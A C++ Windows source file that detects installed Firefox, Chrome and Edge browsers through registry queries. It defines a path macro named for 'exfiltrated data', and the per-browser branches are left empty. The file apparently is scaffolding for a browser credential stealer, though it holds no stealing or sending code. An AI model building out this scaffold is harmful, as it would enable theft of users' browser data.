#include <stdio.h>
#include <tchar.h>

#include <windows.h>

#define MAX_KEY_LENGTH 255
#define MAX_VALUE_NAME 16383
#define PATH_TO_EXFILTRATED_DATA "Documents"

bool verify_browser_installation(const LPCWSTR p_name);

int main(int argc, char** argv) {
	// Firefox
	if (verify_browser_installation(L"Software\\Mozilla\\Firefox"))
	{
		
	}

	// Chrome
	if (verify_browser_installation(L"Software\\Google\\Chrome"))
	{

	}

	// Edge
	if (verify_browser_installation(L"Software\\Microsoft\\Edge"))
	{

	}

	return 0;
}

bool verify_browser_installation(const LPCWSTR p_name) {
	HKEY hKey = 0;
	::RegOpenKeyEx(
		HKEY_CURRENT_USER,
		p_name,
		0,
		KEY_READ,
		&hKey
	);

	TCHAR    achKey[MAX_KEY_LENGTH];			// buffer for subkey name
	DWORD    cbName = 0;						// size of name string 
	TCHAR    achClass[MAX_PATH] = TEXT("");		// buffer for class name 
	DWORD    cchClassName = MAX_PATH;			// size of class string 
	DWORD    cSubKeys = 0;						// number of subkeys 
	DWORD    cbMaxSubKey = 0;					// longest subkey size 
	DWORD    cchMaxClass = 0;					// longest class string 
	DWORD    cValues = 0;						// number of values for key 
	DWORD    cchMaxValue = 0;					// longest value name 
	DWORD    cbMaxValueData = 0;				// longest value data 
	DWORD    cbSecurityDescriptor = 0;			// size of security descriptor 
	FILETIME ftLastWriteTime;					// last write time 

	DWORD i = 0, j = 0, retCode = 0;

	TCHAR  achValue[MAX_VALUE_NAME] = { '\0' };
	DWORD cchValue = MAX_VALUE_NAME;

	// Get the class name and the value count. 
	retCode = ::RegQueryInfoKey(
		hKey,						// key handle 
		achClass,					// buffer for class name 
		&cchClassName,				// size of class string 
		NULL,						// reserved 
		&cSubKeys,					// number of subkeys 
		&cbMaxSubKey,				// longest subkey size 
		&cchMaxClass,				// longest class string 
		&cValues,					// number of values for this key 
		&cchMaxValue,				// longest value name 
		&cbMaxValueData,			// longest value data 
		&cbSecurityDescriptor,		// security descriptor 
		&ftLastWriteTime			// last write time
	);

	if (cSubKeys)
	{
		return true;
	}
	return false;
}